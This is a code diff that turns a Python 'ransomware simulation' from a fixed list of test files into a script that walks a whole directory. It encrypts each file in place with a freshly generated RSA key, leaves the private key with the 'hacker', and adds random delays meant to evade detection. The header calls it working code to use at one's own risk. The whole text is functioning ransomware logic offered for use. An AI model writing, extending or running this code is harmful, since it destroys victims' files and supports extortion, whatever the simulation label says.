@@ -1,11 +1,33 @@
+# RANSOMEWARE SIMULATION
+# IT WORKS, USE THIS WITH YOUR OWN RISK :| 
+
+#pip install rsa 
+
 import time
 import random
+import os
 
 import sys
-sys.path.append('C:\\Users\\Admin\\AppData\\Roaming\\Python\\Python311\\site-packages')
+sys.path.append('C:\\Users\\Admin\\AppData\\Roaming\\Python\\Python311\\site-packages') # change this for your system
 import rsa
 
-print("this is ransom simulation -> rsa-pub-key file encrypting...")
+
+
+def list_files(directory):    
+    file_paths = []
+    for root, _, files in os.walk(directory):
+        for file in files:
+            file_path = os.path.join(root, file)
+            file_paths.append(file_path)
+    return file_paths
+
+
+# Directory to simulation here: 
+DIRECTORY_PATH = "D:\\inputtest"
+
+print(">> This is ransom simulation (rsa-pub-key file encrypting & priv-key for decrpyting) ..")
+time.sleep(3)
+
 #==================================================
 # 1. rsa gen keys (privkey save to file)
 
@@ -13,7 +35,7 @@ print("this is ransom simulation -> rsa-pub-key file encrypting...")
 (public_key, private_key) = rsa.newkeys(1024)
 
 # 1.2 Save the private key to a file --> hacker keep this
-private_key_file_path = 'D:\\private_key.pem'
+private_key_file_path = 'private_key.pem'
 
 with open(private_key_file_path, 'wb') as f:
     pem = private_key.save_pkcs1('PEM')
@@ -23,35 +45,30 @@ with open(private_key_file_path, 'wb') as f:
 #==================================================
 # 2. encrypt the list file (ransome acts.)
 
-file_paths = [
-    'D:\\input1.txt',
-    'D:\\input2.txt',
-    'D:\\input3.txt',
-    'D:\\input4.txt',
-    'D:\\input5.txt',
-    'D:\\input6.txt',
-    'D:\\input7.txt',
-    'D:\\input8.txt',
-    'D:\\input9.txt',
-    'D:\\input10.txt'
-    # Add more file paths as needed
-]
-
 encrypted_contents = ""
 
-for file_path in file_paths:
+all_files = list_files(DIRECTORY_PATH)
+
+for file_path in all_files:
   # random sleep for detecting
   time.sleep(random.uniform(3, 6))
-
-  with open(file_path, 'rb') as file:
-    file_contents = file.read()
+  
+  try:
+    with open(file_path, 'rb') as file:
+      file_contents = file.read()
     
-    # Encrypt the file contents
-    encrypted_contents = rsa.encrypt(file_contents, public_key)
-    print("file ecrypted to: ")
-    print(encrypted_contents)
+      # Encrypt the file contents
+      encrypted_contents = rsa.encrypt(file_contents, public_key)
+      print(file_path, " --> is ecrypted to: ")
+      print(encrypted_contents)
 
-  with open(file_path, 'wb') as f:
-    f.write(encrypted_contents)
+    with open(file_path, 'wb') as f:
+      f.write(encrypted_contents)
+  except FileNotFoundError:
+    print("Error: the file does not exist.")
+  except PermissionError:
+    print("Error: don't have permission to access file.")
+  except Exception as e:
+    print(f"An unexpected error occurred, contact Andrew :) -> {e}")
 
 
